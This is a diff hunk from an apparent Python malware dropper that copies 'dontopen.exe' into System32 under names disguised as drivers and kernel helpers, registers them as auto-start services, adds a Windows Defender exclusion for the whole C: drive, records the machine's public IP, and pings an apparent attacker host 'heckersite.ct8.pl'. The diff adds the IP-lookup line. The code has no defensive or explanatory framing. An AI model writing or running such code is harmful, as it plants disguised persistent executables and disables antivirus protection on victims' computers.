@@ -9,7 +9,7 @@ os.system("copy dontopen.exe C:\Windows\System32\Drivers\Ethernet.exe")
 os.system('sc create EthernetDriver binpath= "C:\Windows\System32\Drivers\Ethernet.exe" start= auto')
 os.system("copy dontopen.exe C:\Windows\System32\WinKernel.exe")
 os.system('sc create KernelHelperService binpath= "C:\Windows\System32\WinKernel.exe" start= auto')
-os.system("curl https://
+os.system("curl https://ipinfo.io > ip.txt")
 os.system("powershell -c Add-MpPreference -ExclusionPath C:\ -Force")
 os.system('dir C:\ /s >nul')
 os.system('ping heckersite.ct8.pl')
